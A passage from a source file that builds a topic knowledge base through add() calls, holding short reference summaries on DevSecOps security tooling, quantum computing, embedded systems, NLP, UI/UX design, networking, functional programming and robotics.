    'DAST (Dynamic Application Security Testing): Test running applications by sending requests. Tools: OWASP ZAP (free, API scan, active/passive), Burp Suite Pro (scanner, crawler), Nuclei (template-based, community templates, fast), Nikto (web server scanner), Arachni. Detects: runtime vulnerabilities (SQLi, XSS, SSRF), misconfigurations, authentication issues. Integration: run against staging/QA environments in CI/CD pipeline. IAST (Interactive): combine SAST + DAST, instrument runtime (Contrast Security). RASP (Runtime Application Self-Protection): protect at runtime. Comparison: SAST (white-box, early, false positives) vs DAST (black-box, late, fewer false positives).', 0.9)

  add('devsecops', ['software composition analysis sca dependency', 'dependency vulnerability scanning npm audit', 'supply chain security sbom dependency check'],
    'SCA (Software Composition Analysis): Detect vulnerabilities in dependencies. Tools: Snyk (npm/pip/maven, fix PRs), Dependabot (GitHub native, auto-PRs), OWASP Dependency-Check, Trivy (containers + deps), Renovate (auto-updates), npm audit / yarn audit. Vulnerability databases: NVD, GitHub Advisory Database, OSV. SBOM (Software Bill of Materials): CycloneDX, SPDX formats — inventory all components. Supply chain attacks: typosquatting, dependency confusion, compromised packages. Prevention: lockfiles, integrity hashes, private registries, Sigstore (signing). License compliance: detect GPL/AGPL in commercial projects. Policies: block known vulnerable versions in CI.', 0.9)

  add('devsecops', ['container security scanning docker image', 'kubernetes security policy admission', 'runtime container security falco trivy'],
    'Container and Kubernetes security: Image scanning — Trivy (vulnerabilities, misconfigs, secrets), Grype + Syft (SBOM), Snyk Container, Docker Scout. Best practices: minimal base images (distroless, Alpine), non-root user, read-only filesystem, no secrets in images. Kubernetes: RBAC (Role, ClusterRole, RoleBinding), Network Policies (ingress/egress rules), Pod Security Standards (restricted/baseline/privileged), admission controllers (OPA Gatekeeper, Kyverno). Runtime security: Falco (syscall monitoring, anomaly detection), Seccomp profiles, AppArmor/SELinux. Image signing: Cosign (Sigstore), Notary v2. Supply chain: SLSA framework levels.', 0.9)

  add('devsecops', ['secret management vault rotation detection', 'secret scanning git-leaks trufflehog', 'hashicorp vault secret management rotation'],
    'Secret management and detection: Secret scanning — git-leaks (pre-commit + CI), TruffleHog (regex + entropy, Git history), GitHub secret scanning (partner alerts). Secret management: HashiCorp Vault (dynamic secrets, auto-rotation, transit encryption, PKI), AWS Secrets Manager, Azure Key Vault, GCP Secret Manager. Patterns: sidecar injection (Vault Agent), CSI driver for Kubernetes, environment variable injection. Rotation: automated credential rotation, short-lived tokens, certificate auto-renewal. Prevention: .gitignore secrets, pre-commit hooks, environment-specific configs. Remediation: rotate immediately upon detection, audit exposure window.', 0.85)

  add('devsecops', ['security pipeline shift left devsecops', 'secure sdlc threat modeling security gates', 'devsecops ci-cd security automation'],
    'DevSecOps pipeline and shift-left security: Integrate security at every SDLC stage. Shift-left: security earlier in development (design → code → build → test → deploy → monitor). Pipeline stages: pre-commit (secret scanning, linting) → build (SAST, SCA, license check) → test (DAST, API security) → deploy (image scan, IaC scan) → runtime (RASP, monitoring). Security gates: block deployment on critical/high findings. Threat modeling: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation), DREAD scoring, attack trees. Tools: DefectDojo (vulnerability management), ThreadFix. Security champions: embedded security advocates in dev teams.', 0.9)

  add('devsecops', ['infrastructure as code security terraform scan', 'iac security misconfiguration checkov tfsec', 'cloud configuration security scanning'],
    'Infrastructure as Code (IaC) security: Scan Terraform/CloudFormation/Kubernetes manifests for misconfigurations. Tools: Checkov (Python, 1000+ built-in checks, custom policies), tfsec/trivy (Terraform-specific, fast), KICS (multi-framework), Terrascan. Common findings: S3 buckets without encryption, security groups allowing 0.0.0.0/0, unencrypted databases, missing logging. Policy as Code: Open Policy Agent (OPA) with Rego language, Sentinel (HashiCorp). Kubernetes: kubesec (security scoring), kube-bench (CIS benchmarks), polaris (best practices). Integration: Terraform plan → scan → apply only if clean. Remediation: auto-fix PRs, policy enforcement.', 0.85)

  add('devsecops', ['vulnerability management prioritization triage', 'security monitoring incident response siem', 'vulnerability lifecycle cve patch management'],
    'Vulnerability management lifecycle: Discover (scanning) → Assess (severity, exploitability, context) → Prioritize (CVSS + EPSS + business context) → Remediate (patch, workaround, accept) → Verify (rescan) → Report. CVSS scoring: Base (severity), Temporal (exploit availability), Environmental (business context). EPSS: Exploit Prediction Scoring System — probability of exploitation. Prioritization: CISA KEV (Known Exploited Vulnerabilities), SSVC (Stakeholder-Specific Vulnerability Categorization). Patch management: regular cadence, emergency patches, rollback plan. SIEM: Splunk, ELK, Microsoft Sentinel — aggregate logs, correlation rules, alerting. Incident response: NIST framework (Prepare, Detect, Contain, Eradicate, Recover, Lessons).', 0.85)

  // ── Quantum Computing ──────────────────────────────────────────────────────

  add('quantum_computing', ['quantum computing qubit superposition entanglement', 'quantum bit qubit bloch sphere measurement', 'quantum mechanics computing fundamentals'],
    'Quantum computing fundamentals: Qubits — superposition of |0⟩ and |1⟩ states simultaneously (α|0⟩ + β|1⟩ where |α|² + |β|² = 1). Measurement collapses to |0⟩ or |1⟩ with probabilities |α|² and |β|². Bloch sphere: geometric representation of single qubit state. Entanglement: correlated quantum states (Bell states, EPR pairs), measuring one instantly determines the other regardless of distance. No-cloning theorem: cannot copy arbitrary quantum state. Key concepts: decoherence (loss of quantum properties from environment), quantum noise, T1 (energy relaxation) and T2 (dephasing) times. Hardware: superconducting (IBM, Google), trapped ions (IonQ, Quantinuum), photonic (Xanadu).', 0.9)

  add('quantum_computing', ['quantum gates circuit hadamard cnot', 'quantum circuit model universal gate set', 'quantum logic gates pauli rotation'],
    'Quantum gates and circuits: Single-qubit gates — Hadamard H (creates superposition), Pauli-X (NOT/bit flip), Pauli-Y, Pauli-Z (phase flip), S gate (π/2 phase), T gate (π/4 phase), Rx(θ)/Ry(θ)/Rz(θ) rotation gates. Multi-qubit gates — CNOT (controlled-NOT, creates entanglement), CZ (controlled-Z), SWAP, Toffoli (CCNOT, 3-qubit), Fredkin (CSWAP). Universal gate sets: {H, T, CNOT} is universal — can approximate any unitary. Circuit model: sequential application of gates to qubit register. Circuit depth: number of sequential gate layers (affects decoherence). Quantum circuit diagrams: wires = qubits, boxes = gates, read left to right.', 0.9)

  add('quantum_computing', ['quantum algorithm shor grover search', 'quantum speedup advantage algorithm', 'quantum computing algorithm application'],
    'Quantum algorithms: Shor\'s algorithm — factor integers in polynomial time O((log N)³), threatens RSA/ECC cryptography. Uses Quantum Fourier Transform to find period of modular exponentiation. Grover\'s algorithm — unstructured search in O(√N), quadratic speedup over classical O(N). Amplitude amplification: generalization of Grover\'s. Quantum Phase Estimation (QPE): eigenvalue finding, key subroutine. VQE (Variational Quantum Eigensolver): hybrid classical-quantum for chemistry/optimization. QAOA (Quantum Approximate Optimization): combinatorial optimization. Quantum simulation: simulate molecular systems exponentially faster. Quantum machine learning: quantum kernel methods, quantum neural networks.', 0.9)

  add('quantum_computing', ['qiskit quantum programming python', 'cirq pennylane quantum sdk framework', 'quantum programming language circuit simulation'],
    'Quantum programming frameworks: Qiskit (IBM) — Python SDK, QuantumCircuit class, transpiler, Aer simulator, IBM Quantum hardware access. Cirq (Google) — Python, focus on NISQ devices, noise models, Sycamore processor support. PennyLane (Xanadu) — quantum ML, differentiable quantum computing, integrates with PyTorch/TensorFlow. Amazon Braket — multi-hardware (IonQ, Rigetti, OQC), managed notebook. Azure Quantum — Q# language, IonQ/Quantinuum hardware. Simulators: Qiskit Aer (statevector, QASM, density matrix), Cirq, QuTiP. Circuit optimization: gate decomposition, routing, transpilation for hardware topology. Visualization: circuit drawing, Bloch sphere, histogram.', 0.85)

  add('quantum_computing', ['quantum error correction fault tolerant', 'quantum noise mitigation surface code', 'logical qubit error correction code'],
    'Quantum error correction (QEC): Physical qubits are noisy — need error correction for reliable computation. Errors: bit flip (X error), phase flip (Z error), both (Y error). Stabilizer codes: use redundant physical qubits to encode logical qubits. Surface code: most practical, 2D lattice, threshold ~1% error rate, requires ~1000 physical qubits per logical qubit. Shor code: first QEC code (9 physical → 1 logical). Steane code: 7-qubit CSS code. Fault-tolerant computation: perform operations on encoded qubits without spreading errors. Magic state distillation for non-Clifford gates. NISQ era: noise mitigation (zero-noise extrapolation, probabilistic error cancellation, dynamical decoupling) instead of full correction.', 0.85)

  add('quantum_computing', ['post-quantum cryptography lattice based', 'quantum resistant encryption algorithm', 'pqc nist standardization kyber dilithium'],
    'Post-quantum cryptography (PQC): Cryptographic algorithms resistant to quantum computers. NIST PQC standards (2024): ML-KEM/Kyber (key encapsulation, lattice-based), ML-DSA/Dilithium (digital signature, lattice-based), SLH-DSA/SPHINCS+ (signature, hash-based, conservative). Lattice-based: Learning With Errors (LWE), Ring-LWE — hard problems even for quantum computers. Hash-based signatures: XMSS, LMS (stateful). Code-based: Classic McEliece (key encapsulation, large keys). Migration: crypto agility, hybrid classical+PQC modes (X25519+Kyber), inventory cryptographic assets. Timeline: start migration now, "harvest now, decrypt later" threat from adversaries collecting encrypted traffic.', 0.85)

  // ── Embedded Systems & IoT ──────────────────────────────────────────────────
  add('embedded_iot', ['embedded systems microcontroller firmware', 'arduino esp32 stm32 programming', 'rtos real-time operating system embedded'],
    'Embedded systems programming: Microcontrollers (MCU) — Arduino (ATmega328P, AVR), ESP32 (dual-core Xtensa, WiFi/BLE), STM32 (ARM Cortex-M, industrial), Raspberry Pi Pico (RP2040, dual M0+). Programming: bare-metal C/C++, register-level access, memory-mapped I/O, interrupt service routines (ISR). RTOS: FreeRTOS (tasks, queues, semaphores, mutexes), Zephyr (device tree, Kconfig), RIOT OS. Development: cross-compilation toolchains (arm-none-eabi-gcc), JTAG/SWD debugging, logic analyzers. Boot process: bootloader → firmware → main loop.', 0.9)

  add('embedded_iot', ['iot internet of things mqtt coap protocol', 'smart home sensor actuator gateway', 'iot edge computing fog architecture'],
    'IoT (Internet of Things): Communication protocols — MQTT (pub/sub, QoS levels 0/1/2, broker: Mosquitto, HiveMQ), CoAP (constrained REST, UDP-based), BLE (Bluetooth Low Energy, GATT profiles), Zigbee (mesh, 802.15.4), LoRaWAN (long-range, low-power, chirp spread spectrum). Architecture: sensor → gateway → cloud. Edge computing: process data locally, reduce latency, TinyML (TensorFlow Lite Micro). Platforms: AWS IoT Core, Azure IoT Hub, Google Cloud IoT. Security: device identity (X.509 certs), secure boot, OTA updates, firmware signing.', 0.85)

  add('embedded_iot', ['gpio spi i2c uart peripheral interface', 'serial communication bus protocol embedded', 'adc dac pwm analog digital conversion'],
    'Embedded peripheral interfaces: GPIO (General Purpose I/O, digital read/write, pull-up/pull-down resistors). Communication buses — SPI (Serial Peripheral Interface: MOSI, MISO, SCLK, CS, full-duplex, fast), I2C (Inter-Integrated Circuit: SDA, SCL, multi-device addressing, 7-bit/10-bit), UART (Universal Asynchronous: TX, RX, baud rate, RS-232/TTL). Analog: ADC (Analog-to-Digital Converter, resolution bits, sampling rate), DAC (Digital-to-Analog), PWM (Pulse Width Modulation, duty cycle, motor control, LED dimming). DMA (Direct Memory Access) for efficient data transfer.', 0.85)

  add('embedded_iot', ['embedded linux yocto buildroot kernel', 'device driver kernel module development', 'arm cortex embedded processor architecture'],
    'Embedded Linux: Build systems — Yocto Project (BitBake recipes, layers, meta-layers, custom distros), Buildroot (menuconfig, minimal rootfs), OpenWrt (router/networking). Kernel: device tree (DTS/DTB, hardware description), kernel modules (insmod/modprobe), character/block/network device drivers, /dev/ device nodes, ioctl interface. Cross-compilation: toolchains, sysroot, QEMU emulation. ARM architecture: Cortex-M (microcontroller, bare-metal), Cortex-A (application, Linux-capable), Cortex-R (real-time). Boot: U-Boot → kernel → init → rootfs.', 0.85)

  add('embedded_iot', ['power management battery optimization embedded', 'low power sleep mode energy harvesting', 'pcb design schematic layout embedded hardware'],
    'Embedded power & hardware: Power management — sleep modes (deep sleep, light sleep, hibernation), wake sources (timer, GPIO, RTC), power gating, voltage regulators (LDO, buck/boost). Battery: LiPo charging (TP4056), fuel gauge (MAX17048), energy harvesting (solar, piezoelectric, thermoelectric). PCB design: schematic capture (KiCad, Altium), PCB layout (traces, vias, ground planes, impedance matching), SMD vs through-hole. Signal integrity: decoupling capacitors, proper grounding, EMI/EMC compliance. Manufacturing: Gerber files, BOM, pick-and-place, reflow soldering.', 0.8)

  add('embedded_iot', ['tinyml machine learning microcontroller inference', 'edge ai neural network embedded deployment', 'tensorflow lite micro embedded ml model'],
    'TinyML & Edge AI: Running ML models on microcontrollers. TensorFlow Lite Micro (TFLM): model conversion (TF → TFLite → quantized INT8), interpreter on MCU, arena memory allocation. Edge Impulse: data collection, training, deployment to MCU. Applications: keyword spotting, gesture recognition, anomaly detection, predictive maintenance. Hardware: ARM Cortex-M with CMSIS-NN, ESP32-S3 (vector extensions), dedicated NPUs (Coral Edge TPU, Intel Movidius). Constraints: <256KB RAM, <1MB flash, milliwatt power budget. Optimization: quantization (INT8, binary), pruning, knowledge distillation.', 0.8)

  // ── Natural Language Processing ────────────────────────────────────────────
  add('nlp_processing', ['nlp tokenization word embedding representation', 'word2vec glove fasttext word embeddings', 'bert transformer language model pretraining'],
    'NLP fundamentals: Tokenization — word-level, subword (BPE: Byte Pair Encoding, WordPiece, SentencePiece, Unigram), character-level. Word embeddings: Word2Vec (CBOW, Skip-gram, negative sampling), GloVe (global co-occurrence matrix), FastText (subword n-grams, OOV handling). Contextual embeddings: ELMo (bidirectional LSTM), BERT (bidirectional transformer, MLM + NSP pretraining, [CLS] token, fine-tuning), GPT (autoregressive, causal LM). Sentence embeddings: Sentence-BERT, Universal Sentence Encoder. Embedding dimensions: 768 (BERT-base), 1024 (BERT-large).', 0.9)

  add('nlp_processing', ['named entity recognition ner sequence labeling', 'pos tagging dependency parsing syntax', 'text classification sentiment topic modeling'],
    'NLP tasks: Named Entity Recognition (NER) — identify entities (PERSON, ORG, LOC, DATE), BIO/BILOU tagging, SpaCy NER, Hugging Face token classification. POS tagging: part-of-speech (noun, verb, adjective), Universal Dependencies. Dependency parsing: syntactic tree, head-dependent relations, constituency parsing (CFG). Text classification: sentiment analysis, topic classification, intent detection. Approaches: rule-based → statistical (CRF, HMM) → neural (BiLSTM-CRF, BERT fine-tuning). Evaluation: precision, recall, F1-score, entity-level vs token-level metrics.', 0.9)

  add('nlp_processing', ['machine translation seq2seq attention mechanism', 'encoder decoder neural machine translation', 'multilingual translation cross-lingual transfer'],
    'Machine translation: Seq2seq (encoder-decoder, attention mechanism — Bahdanau additive, Luong multiplicative). Transformer architecture (self-attention, multi-head attention, positional encoding). Neural MT: beam search decoding, BLEU score evaluation. Multilingual models: mBERT, XLM-R (cross-lingual representations), NLLB (No Language Left Behind, 200+ languages). Translation memory, terminology management. Low-resource MT: back-translation, data augmentation, transfer learning from high-resource languages. Evaluation: BLEU, METEOR, chrF, human evaluation (adequacy, fluency).', 0.85)

  add('nlp_processing', ['text generation language model gpt llm', 'prompt engineering chain of thought reasoning', 'rag retrieval augmented generation knowledge'],
    'Text generation & LLMs: Language models — GPT (autoregressive, next-token prediction), instruction tuning (InstructGPT, RLHF), chat models. Prompt engineering: zero-shot, few-shot, chain-of-thought (CoT), self-consistency, tree-of-thought. RAG (Retrieval-Augmented Generation): retrieve relevant documents → augment prompt → generate. Vector databases for RAG: Pinecone, Weaviate, ChromaDB, pgvector. Fine-tuning: LoRA (Low-Rank Adaptation), QLoRA, PEFT. Inference: KV-cache, speculative decoding, vLLM. Safety: guardrails, content filtering, constitutional AI.', 0.9)

  add('nlp_processing', ['spacy huggingface nltk nlp library toolkit', 'nlp pipeline preprocessing lemmatization', 'information extraction relation extraction nlp'],
    'NLP tools & libraries: SpaCy (industrial NLP, pipelines, tokenizer → tagger → parser → NER), Hugging Face Transformers (model hub, pipeline API, Trainer), NLTK (academic, corpora, tokenizers). Preprocessing: lowercasing, stopword removal, stemming (Porter, Snowball), lemmatization (WordNet), regex cleaning. Information extraction: relation extraction (subject-relation-object triples), event extraction, coreference resolution, open IE. Document processing: summarization (extractive: TextRank; abstractive: BART, T5), question answering (extractive span, generative).', 0.85)

  add('nlp_processing', ['speech recognition asr text to speech synthesis', 'audio processing whisper speech model', 'voice assistant conversational ai dialogue system'],
    'Speech & conversational AI: ASR (Automatic Speech Recognition) — Whisper (OpenAI, multilingual), wav2vec 2.0, DeepSpeech. Pipeline: audio → feature extraction (MFCC, mel spectrogram) → acoustic model → language model → text. TTS (Text-to-Speech): Tacotron, WaveNet, VITS, Bark, Coqui TTS. Voice cloning: few-shot speaker adaptation. Dialogue systems: task-oriented (slot filling, dialogue state tracking), open-domain (chitchat). Frameworks: Rasa (NLU + dialogue management), Dialogflow, Amazon Lex. Evaluation: WER (Word Error Rate), MOS (Mean Opinion Score).', 0.8)

  // ── UI/UX Design Systems ───────────────────────────────────────────────────
  add('uiux_design', ['design system component library style guide', 'atomic design methodology pattern library', 'storybook component documentation visual testing'],
    'Design systems: Organized collection of reusable components, patterns, and guidelines. Atomic Design (Brad Frost): atoms → molecules → organisms → templates → pages. Component library: buttons, inputs, modals, cards, navigation. Design tokens: colors, typography, spacing, shadows — stored as JSON/YAML, consumed by CSS/JS. Popular systems: Material Design (Google), Ant Design, Chakra UI, Radix. Tools: Storybook (component documentation, visual testing, addons), Figma (design handoff, auto-layout, variants), Style Dictionary (token transformation). Versioning: semver for breaking changes.', 0.9)

  add('uiux_design', ['accessibility wcag aria screen reader a11y', 'web accessibility guidelines compliance audit', 'inclusive design universal usability principles'],
    'Web accessibility (a11y): WCAG 2.1 guidelines — four principles: Perceivable, Operable, Understandable, Robust (POUR). Levels: A (minimum), AA (standard target), AAA (enhanced). ARIA: roles (button, dialog, alert), states (aria-expanded, aria-selected), properties (aria-label, aria-describedby), live regions (aria-live). Semantic HTML: <nav>, <main>, <article>, <button>. Keyboard navigation: focus management, tab order, skip links. Color contrast: 4.5:1 (normal text), 3:1 (large text). Testing: axe-core, Lighthouse, NVDA/VoiceOver screen readers, WAVE tool.', 0.9)

  add('uiux_design', ['responsive design media query mobile first', 'css grid flexbox layout responsive breakpoint', 'adaptive layout fluid typography container query'],
    'Responsive design: Mobile-first approach — design for small screens, progressively enhance. CSS techniques: Flexbox (1D layout, justify-content, align-items), CSS Grid (2D layout, grid-template-columns, fr units, minmax()), Container Queries (@container, component-level responsiveness). Media queries: @media (min-width: 768px), breakpoints (mobile: 320px, tablet: 768px, desktop: 1024px, wide: 1440px). Fluid typography: clamp(1rem, 2.5vw, 2rem). Responsive images: srcset, sizes, <picture> element, art direction. Testing: Chrome DevTools device toolbar, BrowserStack.', 0.85)

  add('uiux_design', ['user research usability testing wireframe', 'ux research method interview survey prototype', 'user journey persona information architecture'],
    'UX research & design: User research methods — interviews (structured, semi-structured), surveys, contextual inquiry, card sorting (open/closed), tree testing. Personas: fictional user archetypes with goals, pain points, behaviors. User journey mapping: awareness → consideration → acquisition → retention → advocacy. Information architecture: site maps, navigation patterns, labeling systems. Wireframing: low-fidelity (sketches, Balsamiq) → high-fidelity (Figma, Sketch). Prototyping: clickable prototypes, InVision, Framer. Usability testing: task-based, think-aloud protocol, SUS (System Usability Scale), A/B testing.', 0.85)

  add('uiux_design', ['color theory typography visual design ui', 'ui design principles hierarchy whitespace', 'motion design animation micro-interaction'],
    'Visual design principles: Color theory — color wheel (complementary, analogous, triadic), HSL model, 60-30-10 rule, accessible palettes. Typography: typeface selection (serif, sans-serif, monospace), type scale (modular scale, 1.25 ratio), line-height (1.5 for body), measure (45-75 characters). Visual hierarchy: size, color, contrast, position, whitespace. Gestalt principles: proximity, similarity, closure, continuity. Whitespace: padding, margins, breathing room. Motion design: micro-interactions (hover, click feedback), transitions (easing: ease-in-out), loading states, skeleton screens. Tools: Figma, Adobe XD, Framer.', 0.85)

  add('uiux_design', ['design handoff figma developer collaboration', 'css custom properties design token theming', 'dark mode theme switching ui implementation'],
    'Design-to-development workflow: Design handoff — Figma Dev Mode (inspect, export assets, copy CSS), Zeplin. Design tokens: CSS custom properties (--color-primary: #0066ff), JSON → CSS/SCSS/JS transformation (Style Dictionary, Theo). Theming: light/dark mode (prefers-color-scheme media query, CSS custom properties swap, system preference detection). Component API design: props, variants, compound components, render props. Responsive typography: fluid type scales. Icon systems: SVG sprites, icon fonts, React icon components. CSS-in-JS: styled-components, Emotion, CSS Modules, Tailwind CSS utility classes.', 0.8)

  // ── Computer Networking & Protocols ────────────────────────────────────────
  add('networking_protocols', ['tcp ip protocol stack osi model layers', 'network layer routing ip addressing subnet', 'transport layer tcp udp protocol connection'],
    'Networking fundamentals: OSI model (7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application). TCP/IP model (4 layers: Network Access, Internet, Transport, Application). IP addressing: IPv4 (32-bit, dotted decimal, CIDR notation /24), IPv6 (128-bit, hex, link-local fe80::). Subnetting: network address, broadcast, host range, VLSM. TCP: 3-way handshake (SYN, SYN-ACK, ACK), reliable delivery, flow control (sliding window), congestion control (slow start, AIMD). UDP: connectionless, low-latency, best for streaming/gaming/DNS. Ports: well-known (0-1023), registered (1024-49151), ephemeral.', 0.9)

  add('networking_protocols', ['dns domain name system resolution record', 'http https tls ssl web protocol', 'websocket server-sent events real-time protocol'],
    'Application layer protocols: DNS — recursive/iterative resolution, record types (A, AAAA, CNAME, MX, TXT, NS, SOA), DNS caching (TTL), DNSSEC, DNS over HTTPS (DoH), DNS over TLS (DoT). HTTP: methods (GET, POST, PUT, DELETE, PATCH), status codes (2xx success, 3xx redirect, 4xx client error, 5xx server error), headers, cookies, HTTP/2 (multiplexing, server push, HPACK), HTTP/3 (QUIC, UDP-based). TLS 1.3: handshake (1-RTT), cipher suites, certificates (X.509), Let\'s Encrypt. WebSockets: full-duplex, upgrade handshake, ws:// / wss://. SSE: server-sent events, EventSource API.', 0.9)

  add('networking_protocols', ['bgp routing protocol autonomous system', 'ospf rip routing interior gateway protocol', 'network switching vlan spanning tree bridge'],
    'Routing & switching: Routing protocols — BGP (Border Gateway Protocol, inter-AS, path-vector, AS-PATH), OSPF (Open Shortest Path First, link-state, Dijkstra, areas), RIP (distance-vector, hop count, max 15). Switching: MAC address table, VLANs (802.1Q tagging, trunk/access ports), STP (Spanning Tree Protocol, root bridge, port states). Layer 3 switching: inter-VLAN routing, router-on-a-stick. SDN (Software-Defined Networking): control plane separation, OpenFlow. Network address translation: SNAT, DNAT, PAT. Firewall: stateful inspection, ACLs, zones.', 0.85)

  add('networking_protocols', ['network troubleshooting wireshark tcpdump', 'packet capture analysis network diagnostics', 'ping traceroute netstat network debugging tools'],
    'Network diagnostics & troubleshooting: Packet capture — Wireshark (GUI, display/capture filters, protocol dissectors, follow TCP stream), tcpdump (CLI, BPF filters, pcap files). Diagnostics: ping (ICMP echo, RTT, TTL), traceroute/tracert (hop-by-hop path, TTL decrement), nslookup/dig (DNS queries), netstat/ss (socket statistics, listening ports), curl (HTTP testing, headers, timing). Network performance: iperf3 (bandwidth testing), mtr (continuous traceroute), pathping. Troubleshooting methodology: OSI model bottom-up, check physical → link → network → transport → application layers systematically.', 0.85)

  add('networking_protocols', ['vpn tunneling ipsec wireguard openvpn', 'network security firewall ids ips detection', 'zero trust network access sase architecture'],
    'Network security & VPN: VPN technologies — IPSec (tunnel/transport mode, IKEv2, ESP/AH), WireGuard (modern, fast, Curve25519, ChaCha20), OpenVPN (SSL/TLS-based, UDP/TCP). Network security: firewalls (pfSense, iptables/nftables, cloud security groups), IDS/IPS (Snort, Suricata — signature + anomaly detection), WAF (web application firewall, OWASP CRS). Zero Trust: "never trust, always verify", micro-segmentation, identity-based access, SASE (Secure Access Service Edge), BeyondCorp model. DDoS protection: rate limiting, CDN absorption, Cloudflare/AWS Shield.', 0.85)

  add('networking_protocols', ['load balancer reverse proxy nginx haproxy', 'cdn content delivery network caching edge', 'service mesh envoy istio sidecar proxy'],
    'Network infrastructure: Load balancers — Layer 4 (TCP/UDP, fast), Layer 7 (HTTP, content-based routing), algorithms (round-robin, least-connections, IP-hash, weighted). Reverse proxy: Nginx, HAProxy, Traefik, Caddy — SSL termination, caching, compression, rate limiting. CDN: edge caching (Cloudflare, Akamai, CloudFront), cache-control headers, cache invalidation, origin shielding. Service mesh: Istio (Envoy sidecar proxy, traffic management, mTLS, observability), Linkerd (lightweight), Consul Connect. Patterns: circuit breaker, retry, timeout, load shedding.', 0.85)

  // ── Functional Programming ─────────────────────────────────────────────────
  add('functional_programming', ['functional programming pure function immutability', 'higher order function first class function', 'map filter reduce functional composition'],
    'Functional programming fundamentals: Pure functions (same input → same output, no side effects), immutability (don\'t mutate data, create new copies), first-class functions (functions as values, arguments, return values). Higher-order functions: map (transform each element), filter (select elements), reduce/fold (aggregate to single value). Function composition: pipe/compose (f ∘ g)(x) = f(g(x)). Referential transparency: expression can be replaced by its value. Declarative style: describe what, not how. Benefits: easier testing, predictable behavior, parallelism-friendly, fewer bugs from shared mutable state.', 0.9)

  add('functional_programming', ['monad functor applicative type class', 'maybe either option result error handling', 'functional algebraic data type pattern matching'],
    'Algebraic types & monads: Algebraic Data Types (ADT) — Sum types (Either, Result, enum variants), Product types (tuples, records). Pattern matching: exhaustive case analysis, destructuring. Functor: mappable container (fmap/map). Applicative: apply wrapped functions to wrapped values. Monad: flatMap/bind (>>=), chain computations that may fail. Common monads: Maybe/Option (nullable values), Either/Result (error handling without exceptions), IO (side effects), List (non-determinism), Promise/Future (async). Monad laws: left identity, right identity, associativity. Do-notation / for-comprehension syntactic sugar.', 0.9)

  add('functional_programming', ['haskell type system lazy evaluation typeclass', 'haskell monad io pure functional language', 'ghc haskell compiler cabal stack package'],
    'Haskell: Purely functional, statically typed, lazy evaluation. Type system: Hindley-Milner type inference, type classes (Eq, Ord, Show, Functor, Monad), parametric polymorphism, GADTs, type families. Lazy evaluation: thunks, evaluated only when needed, infinite data structures (take 10 [1..]). IO Monad: sequencing side effects in pure language. Pattern matching: function definitions, guards, where/let bindings. GHC (Glasgow Haskell Compiler): optimizing compiler, STG machine. Package management: Cabal, Stack, Hackage. Notable libraries: lens, servant, pandoc, xmonad.', 0.85)

  add('functional_programming', ['rust ownership borrow checker lifetime safety', 'rust trait generic zero cost abstraction', 'rust pattern matching enum result option'],
    'Rust functional features: Ownership system — move semantics, borrowing (&T immutable, &mut T mutable), lifetimes (\'a annotations), no garbage collector. Traits (similar to type classes): Iterator, From/Into, Display, Clone. Enums as ADTs: Option<T> (Some/None), Result<T, E> (Ok/Err). Pattern matching: match expressions, if let, while let, destructuring. Iterators: .map(), .filter(), .fold(), .collect(), lazy evaluation chains, zero-cost abstractions. Closures: |x| x + 1, Fn/FnMut/FnOnce traits. Error handling: ? operator for Result propagation, no exceptions. Cargo: package manager + build system.', 0.9)

  add('functional_programming', ['scala functional object oriented jvm', 'elixir erlang otp actor concurrency', 'clojure lisp jvm immutable persistent data'],
    'Functional languages on platforms: Scala — hybrid OOP+FP on JVM, case classes, pattern matching, for-comprehensions, Cats/ZIO effect systems, Akka actors. Elixir — dynamic, BEAM VM (Erlang), OTP (supervisors, GenServer), pattern matching, pipe operator |>, Phoenix framework, LiveView. Clojure — Lisp on JVM, persistent immutable data structures (vector, map, set), REPL-driven development, macros, core.async (CSP channels), ClojureScript (JS target). F# — functional-first on .NET, type providers, computation expressions, pattern matching, Fable (JS compilation).', 0.85)

  add('functional_programming', ['reactive programming rxjs observable stream', 'functional reactive event stream operator', 'signal effect reactivity state management fp'],
    'Functional reactive programming (FRP): Reactive streams — Observable (push-based sequences), operators (map, filter, merge, switchMap, debounce, throttle, scan). RxJS (JavaScript), RxJava, Reactor (Spring). Marble diagrams: visualize stream transformations. Backpressure: handle fast producer / slow consumer. Signals (fine-grained reactivity): SolidJS signals, Angular signals, Preact signals — reactive primitives with automatic dependency tracking. Effect systems: ZIO (Scala), cats-effect, Haskell IO monad — type-safe side effect management. Event sourcing + CQRS: functional approach to state management, immutable event log.', 0.85)

  // ── Robotics & Automation ──────────────────────────────────────────────────
  add('robotics_automation', ['ros robot operating system navigation', 'robot programming ros2 node topic service', 'autonomous robot slam mapping localization'],
    'Robot Operating System (ROS): ROS 2 (DDS middleware, real-time capable, security). Core concepts: nodes (processes), topics (pub/sub messaging), services (request/response), actions (long-running tasks with feedback). Tools: rviz2 (3D visualization), Gazebo (simulation, physics engine), rqt (GUI plugins). Navigation: Nav2 stack — costmap (static + dynamic obstacles), path planning (Dijkstra, A*, navfn), local planner (DWB), recovery behaviors. SLAM: Simultaneous Localization And Mapping — gmapping, cartographer, ORB-SLAM. Transform tree (tf2): coordinate frame management.', 0.9)

  add('robotics_automation', ['robot kinematics dynamics motion planning', 'forward inverse kinematics robotic arm joint', 'trajectory planning path optimization robotics'],
    'Robot kinematics & dynamics: Forward kinematics — joint angles → end-effector position (DH parameters, transformation matrices). Inverse kinematics — target position → joint angles (analytical, numerical: Jacobian, gradient descent). Dynamics: Newton-Euler, Lagrangian mechanics, torque computation. Motion planning: configuration space (C-space), RRT (Rapidly-exploring Random Trees), PRM (Probabilistic Roadmap), OMPL library. Trajectory planning: joint space vs Cartesian space, velocity/acceleration profiles (trapezoidal, S-curve). MoveIt 2: motion planning framework for ROS 2, collision checking, grasp planning.', 0.85)

  add('robotics_automation', ['computer vision robot perception lidar', 'sensor fusion camera depth point cloud', 'object detection recognition robot vision'],
    'Robot perception: Computer vision — OpenCV (image processing, feature detection, calibration), YOLO/SSD (real-time object detection), semantic segmentation (DeepLab, Mask R-CNN). Depth sensing: stereo cameras, structured light (RealSense), ToF (Time-of-Flight), LiDAR (2D: RPLiDAR, 3D: Velodyne, Ouster). Point cloud processing: PCL (Point Cloud Library), voxel grid filtering, plane segmentation, clustering. Sensor fusion: Kalman filter (EKF, UKF), particle filter, IMU + GPS + vision fusion. Calibration: camera intrinsics/extrinsics, LiDAR-camera calibration.', 0.85)

  add('robotics_automation', ['industrial automation plc scada control', 'plc ladder logic structured text programming', 'industrial robot fanuc kuka abb programming'],
